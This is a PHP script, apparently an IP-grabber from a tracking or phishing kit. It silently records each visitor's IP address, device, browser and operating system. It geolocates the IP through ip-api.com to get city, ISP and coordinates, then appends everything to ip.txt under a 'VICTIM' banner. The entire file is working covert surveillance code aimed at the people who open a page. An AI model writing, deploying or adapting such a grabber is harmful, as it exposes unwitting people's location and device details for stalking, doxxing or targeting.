<?php
if(isset($_SERVER['HTTP_CLIENT_IP'])) {
    $ipaddr = $_SERVER['HTTP_CLIENT_IP'];
} elseif(isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ipaddr = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ipaddr = $_SERVER['REMOTE_ADDR'];
}

if(strpos($ipaddr,',') !== false) {
    $ipaddr = preg_split("/\,/", $ipaddr)[0];
}

$user_agent = $_SERVER['HTTP_USER_AGENT'];
$timestamp = date('Y-m-d H:i:s');

function getDeviceType($ua) {
    if(preg_match('/(android|webos|iphone|ipad|ipod|blackberry)/i', $ua)) return "Mobile";
    if(preg_match('/(tablet|ipad)/i', $ua)) return "Tablet";
    return "Desktop";
}

function getBrowser($ua) {
    if(preg_match('/Firefox/i', $ua)) return "Firefox";
    if(preg_match('/Chrome/i', $ua)) return "Chrome";
    if(preg_match('/Safari/i', $ua)) return "Safari";
    if(preg_match('/Edge/i', $ua)) return "Edge";
    return "Unknown";
}

function getOS($ua) {
    if(preg_match('/windows/i', $ua)) return "Windows";
    if(preg_match('/mac os x/i', $ua)) return "MacOS";
    if(preg_match('/android/i', $ua)) return "Android";
    if(preg_match('/iphone|ipad/i', $ua)) return "iOS";
    return "Linux";
}

$device = getDeviceType($user_agent);
$browser = getBrowser($user_agent);
$os = getOS($user_agent);

$geo_data = @file_get_contents("http://ip-api.com/json/{$ipaddr}?fields=country,city,isp,lat,lon");
$geo = json_decode($geo_data, true);

$log = "\n╔═══════════════════════════════════╗\n";
$log .= "║  VICTIM - " . $timestamp . "  ║\n";
$log .= "╚═══════════════════════════════════╝\n";
$log .= "IP: " . $ipaddr . "\n";

if($geo) {
    $log .= "Location: " . $geo['city'] . ", " . $geo['country'] . "\n";
    $log .= "ISP: " . $geo['isp'] . "\n";
    $log .= "Coords: " . $geo['lat'] . ", " . $geo['lon'] . "\n";
}

$log .= "Device: " . $device . " | OS: " . $os . " | Browser: " . $browser . "\n";
$log .= "User-Agent: " . $user_agent . "\n";
$log .= str_repeat("─", 40) . "\n";

file_put_contents('ip.txt', $log, FILE_APPEND);
?>
